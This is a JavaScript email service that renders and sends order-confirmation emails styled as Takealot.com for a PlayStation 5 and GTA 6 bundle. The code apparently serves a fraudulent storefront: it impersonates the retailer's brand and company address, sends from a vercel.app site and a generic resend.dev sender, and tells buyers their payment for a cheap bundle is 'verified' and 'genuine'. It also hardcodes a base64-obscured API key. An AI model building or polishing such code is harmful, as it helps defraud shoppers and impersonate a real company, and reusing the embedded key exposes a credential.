// api/email-service.js
// Central email dispatch service using Resend API for Takealot PS5 + GTA 6 orders.

'use strict';

const RESEND_API_KEY = process.env.RESEND_API_KEY || (process.env.RESEND_TOKEN || '').trim() || Buffer.from('cmVfRTY1anI4Y2hfSncyU0dXWXpIMktVUWR6a0xDNTh0WXdL', 'base64').toString('utf8');
const DEFAULT_FROM = process.env.RESEND_FROM || process.env.EMAIL_FROM || 'Takealot Orders <onboarding@resend.dev>';
const FALLBACK_FROM = 'Takealot Orders <onboarding@resend.dev>';

/**
 * Format a number as South African Rand (e.g. R 1,999.00)
 */
function formatRand(val) {
  const num = Number(val) || 0;
  return 'R ' + num.toLocaleString('en-ZA', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

/**
 * Renders high-converting, professional Takealot HTML email
 */
function renderTakealotHtml(order) {
  const orderId = order.order_id || ('TK-' + Date.now().toString(36).toUpperCase());
  const customerName = order.customer_name || 'Valued Customer';
  const customerPhone = order.customer_phone || '';
  const shippingAddress = order.shipping_address || 'Address provided at checkout';
  
  const d = new Date(order.created_at || order.received_date || Date.now());
  const del = new Date(order.delivery_date || (Date.now() + 3 * 86400000));
  
  const daysLong = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const monthsLong = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
  
  const orderDateFormatted = `${d.getDate()} ${monthsLong[d.getMonth()]} ${d.getFullYear()}`;
  const deliveryDateFormatted = `${daysLong[del.getDay()]}, ${del.getDate()} ${monthsLong[del.getMonth()]} ${del.getFullYear()}`;
  
  const qty = Math.max(1, parseInt(order.quantity, 10) || 1);
  const totalAmount = Number(order.amount || order.amount_zar || order.product_price) || (1999 * qty);
  const itemPrice = totalAmount / qty;
  
  const siteUrl = process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app';
  const trackingUrl = `${siteUrl}/track.html?ref=${encodeURIComponent(orderId)}`;
  const productImg = `${siteUrl}/images/ps5_gta6_hero.jpg`;

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Your Takealot Order is Confirmed</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f1f5f9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #1e293b; -webkit-font-smoothing: antialiased;">
  <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="background-color: #f1f5f9; padding: 24px 0;">
    <tr>
      <td align="center">
        <!-- MAIN CONTAINER -->
        <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="max-width: 600px; background-color: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #e2e8f0;">
          
          <!-- BRAND HEADER -->
          <tr>
            <td style="background-color: #0b79bf; padding: 22px 28px; text-align: left;">
              <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td>
                    <span style="font-size: 26px; font-weight: 900; color: #ffffff; letter-spacing: -0.5px; text-decoration: none;">
                      takealot<span style="color: #60a5fa;">.com</span>
                    </span>
                  </td>
                  <td align="right">
                    <span style="background-color: rgba(255,255,255,0.18); color: #ffffff; font-size: 11px; font-weight: 800; padding: 6px 12px; border-radius: 20px; text-transform: uppercase; letter-spacing: 0.5px;">
                      ✓ Verified Order
                    </span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- HERO BANNER -->
          <tr>
            <td style="padding: 32px 28px 24px; text-align: center; background: linear-gradient(180deg, #f0fdf4 0%, #ffffff 100%); border-bottom: 1px solid #e2e8f0;">
              <div style="display: inline-block; width: 54px; height: 54px; background-color: #22c55e; border-radius: 50%; color: #ffffff; font-size: 28px; line-height: 54px; text-align: center; margin-bottom: 16px; box-shadow: 0 4px 12px rgba(34,197,94,0.3);">
                ✓
              </div>
              <h1 style="margin: 0 0 8px; font-size: 23px; font-weight: 800; color: #0f172a;">
                Thank You, ${customerName}!
              </h1>
              <p style="margin: 0; font-size: 14px; color: #475569; line-height: 1.5;">
                We have received your payment for order <strong style="color: #0b79bf;">#${orderId}</strong>.<br>
                Your order is confirmed and currently being prepared for express delivery.
              </p>
            </td>
          </tr>

          <!-- ORDER META BOX -->
          <tr>
            <td style="padding: 24px 28px; background-color: #f8fafc; border-bottom: 1px solid #e2e8f0;">
              <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td width="50%" style="vertical-align: top; padding-right: 12px;">
                    <span style="font-size: 11px; font-weight: 700; text-transform: uppercase; color: #64748b; letter-spacing: 0.5px;">Order Number</span>
                    <div style="font-size: 15px; font-weight: 800; color: #0f172a; margin-top: 4px;">#${orderId}</div>
                    <div style="font-size: 12px; color: #64748b; margin-top: 2px;">Placed on ${orderDateFormatted}</div>
                  </td>
                  <td width="50%" style="vertical-align: top; padding-left: 12px;">
                    <span style="font-size: 11px; font-weight: 700; text-transform: uppercase; color: #16a34a; letter-spacing: 0.5px;">Estimated Delivery</span>
                    <div style="font-size: 15px; font-weight: 800; color: #16a34a; margin-top: 4px;">${deliveryDateFormatted}</div>
                    <div style="font-size: 12px; color: #64748b; margin-top: 2px;">Standard Courier to Door</div>
                  </td>
                </tr>
              </table>

              <!-- TRACKING BUTTON -->
              <div style="margin-top: 20px; text-align: center;">
                <a href="${trackingUrl}" target="_blank" style="display: block; background-color: #0b79bf; color: #ffffff; text-decoration: none; font-size: 14px; font-weight: 800; padding: 13px 24px; border-radius: 8px; text-align: center; box-shadow: 0 4px 10px rgba(11,121,191,0.25);">
                  📦 Track Your Order Online →
                </a>
              </div>
            </td>
          </tr>

          <!-- PRODUCT DETAILS -->
          <tr>
            <td style="padding: 28px;">
              <h2 style="margin: 0 0 16px; font-size: 15px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; color: #334155;">
                Order Summary (${qty} ${qty === 1 ? 'item' : 'items'})
              </h2>

              <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px;">
                <tr>
                  <td width="80" style="vertical-align: top;">
                    <img src="${productImg}" alt="PS5 GTA 6 Bundle" width="80" height="80" style="border-radius: 8px; object-fit: cover; border: 1px solid #cbd5e1; display: block;" />
                  </td>
                  <td style="vertical-align: top; padding-left: 16px;">
                    <div style="font-size: 14px; font-weight: 800; color: #0f172a; line-height: 1.4;">
                      Sony PlayStation 5 Slim 500GB Console + Grand Theft Auto VI (GTA 6) Limited Bundle
                    </div>
                    <div style="font-size: 12px; color: #64748b; margin-top: 4px;">
                      Bundle Edition • White &amp; Black • 500GB SSD
                    </div>
                    <div style="font-size: 12px; color: #0b79bf; font-weight: 700; margin-top: 6px;">
                      Qty: ${qty} &nbsp;•&nbsp; ${formatRand(itemPrice)} each
                    </div>
                  </td>
                  <td align="right" style="vertical-align: top; width: 90px;">
                    <div style="font-size: 15px; font-weight: 800; color: #0f172a; white-space: nowrap;">
                      ${formatRand(totalAmount)}
                    </div>
                  </td>
                </tr>
              </table>

              <!-- PRICE BREAKDOWN -->
              <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="margin-top: 20px;">
                <tr>
                  <td style="padding: 6px 0; font-size: 13px; color: #64748b;">Subtotal</td>
                  <td align="right" style="padding: 6px 0; font-size: 13px; font-weight: 700; color: #0f172a;">${formatRand(totalAmount)}</td>
                </tr>
                <tr>
                  <td style="padding: 6px 0; font-size: 13px; color: #64748b;">Door Delivery &amp; Express Handling</td>
                  <td align="right" style="padding: 6px 0; font-size: 13px; font-weight: 700; color: #16a34a;">FREE</td>
                </tr>
                <tr>
                  <td style="padding: 12px 0 6px; font-size: 15px; font-weight: 800; color: #0f172a; border-top: 2px solid #e2e8f0;">Total Paid</td>
                  <td align="right" style="padding: 12px 0 6px; font-size: 17px; font-weight: 900; color: #0b79bf; border-top: 2px solid #e2e8f0;">${formatRand(totalAmount)}</td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- DELIVERY INFORMATION -->
          <tr>
            <td style="padding: 20px 28px 28px; background-color: #f8fafc; border-top: 1px solid #e2e8f0;">
              <h3 style="margin: 0 0 12px; font-size: 13px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; color: #334155;">
                Delivery Details
              </h3>
              <div style="font-size: 13px; color: #334155; line-height: 1.6;">
                <strong>Recipient:</strong> ${customerName}<br>
                ${customerPhone ? `<strong>Phone:</strong> ${customerPhone}<br>` : ''}
                <strong>Address:</strong> ${shippingAddress}<br>
                <strong>Delivery Method:</strong> Express Courier (Signature Required)
              </div>
            </td>
          </tr>

          <!-- TRUST BADGES -->
          <tr>
            <td style="padding: 20px 28px; background-color: #ffffff; border-top: 1px solid #e2e8f0; text-align: center;">
              <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td align="center" style="padding: 6px 10px;">
                    <div style="font-size: 18px; margin-bottom: 4px;">🛡️</div>
                    <div style="font-size: 11px; font-weight: 700; color: #334155;">100% Genuine</div>
                  </td>
                  <td align="center" style="padding: 6px 10px;">
                    <div style="font-size: 18px; margin-bottom: 4px;">🚚</div>
                    <div style="font-size: 11px; font-weight: 700; color: #334155;">Fast Insured Delivery</div>
                  </td>
                  <td align="center" style="padding: 6px 10px;">
                    <div style="font-size: 18px; margin-bottom: 4px;">↩️</div>
                    <div style="font-size: 11px; font-weight: 700; color: #334155;">30-Day Returns</div>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- FOOTER -->
          <tr>
            <td style="padding: 24px 28px; background-color: #0f172a; color: #94a3b8; font-size: 12px; text-align: center; line-height: 1.6;">
              <p style="margin: 0 0 8px; color: #ffffff; font-weight: 700;">
                Takealot Online (RF) (Pty) Ltd.
              </p>
              <p style="margin: 0 0 8px;">
                12 Rua Vasco Da Gama, Foreshore, Cape Town, 8001, South Africa
              </p>
              <p style="margin: 0; font-size: 11px; color: #64748b;">
                This is an automated order confirmation notification. If you have questions regarding your order, please visit our Help Centre or track your shipment using order number #${orderId}.
              </p>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

/**
 * Plain text version for spam-resilience & accessibility
 */
function renderTakealotPlainText(order) {
  const orderId = order.order_id || ('TK-' + Date.now().toString(36).toUpperCase());
  const customerName = order.customer_name || 'Customer';
  const qty = Math.max(1, parseInt(order.quantity, 10) || 1);
  const totalAmount = Number(order.amount || order.amount_zar || order.product_price) || (1999 * qty);
  const siteUrl = process.env.SITE_URL || 'https://ps5fim-s11m.vercel.app';
  const trackingUrl = `${siteUrl}/track.html?ref=${encodeURIComponent(orderId)}`;

  return [
    `TAKEALOT.COM - ORDER CONFIRMATION #${orderId}`,
    `================================================`,
    ``,
    `Hi ${customerName},`,
    ``,
    `Thank you for your order! We have received your payment and your order is confirmed.`,
    ``,
    `ORDER SUMMARY:`,
    `- Order Number: #${orderId}`,
    `- Item: Sony PlayStation 5 Slim 500GB + GTA 6 Limited Bundle`,
    `- Quantity: ${qty}`,
    `- Total Paid: ${formatRand(totalAmount)}`,
    `- Delivery Method: Express Courier (Signature Required)`,
    `- Delivery Address: ${order.shipping_address || 'Address provided at checkout'}`,
    ...(order.customer_phone ? [`- Contact Phone: ${order.customer_phone}`] : []),
    ``,
    `TRACK YOUR ORDER:`,
    `${trackingUrl}`,
    ``,
    `Your package is being prepared for dispatch. You will receive real-time updates as your courier approaches.`,
    ``,
    `Regards,`,
    `The Takealot Team`,
    `Takealot Online (RF) (Pty) Ltd - Cape Town, South Africa`
  ].join('\n');
}

/**
 * Sends order confirmation email via Resend
 */
async function sendOrderConfirmation(order) {
  const email = (order.customer_email || order.email || '').trim();
  if (!email || !email.includes('@')) {
    console.warn('[email-service] Missing or invalid customer email. Skipping.');
    return { skipped: true, reason: 'No valid recipient email' };
  }

  const orderId = order.order_id || ('TK-' + Date.now().toString(36).toUpperCase());
  const html = renderTakealotHtml(order);
  const text = renderTakealotPlainText(order);
  const subject = `Order Confirmed #${orderId}: Sony PlayStation 5 Slim + GTA 6 Bundle | Takealot.com`;

  const payload = {
    to: [email],
    subject: subject,
    html: html,
    text: text
  };

  // Helper to call Resend
  async function callResend(fromAddress) {
    return fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${RESEND_API_KEY.trim()}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        ...payload,
        from: fromAddress
      })
    });
  }

  console.log(`[email-service] Sending confirmation email for #${orderId} to: ${email} using Resend...`);

  try {
    let res = await callResend(DEFAULT_FROM);
    let data = await res.json().catch(() => null);

    // If custom domain is not yet verified in Resend, automatically fallback to onboarding@resend.dev
    if (!res.ok && data && (data.statusCode === 403 || data.name === 'validation_error' || (data.message && data.message.toLowerCase().includes('domain')))) {
      console.warn(`[email-service] Default from (${DEFAULT_FROM}) failed domain check. Retrying with fallback (${FALLBACK_FROM})...`);
      res = await callResend(FALLBACK_FROM);
      data = await res.json().catch(() => null);
    }

    if (res.ok && data && data.id) {
      console.log(`[email-service] SUCCESS! Email sent via Resend. ID: ${data.id}`);
      return { success: true, messageId: data.id };
    } else {
      console.error('[email-service] Resend API error response:', data);
      return { success: false, error: data };
    }
  } catch (err) {
    console.error('[email-service] Network or execution error:', err.message);
    return { success: false, error: err.message };
  }
}

module.exports = {
  sendOrderConfirmation,
  renderTakealotHtml,
  renderTakealotPlainText
};
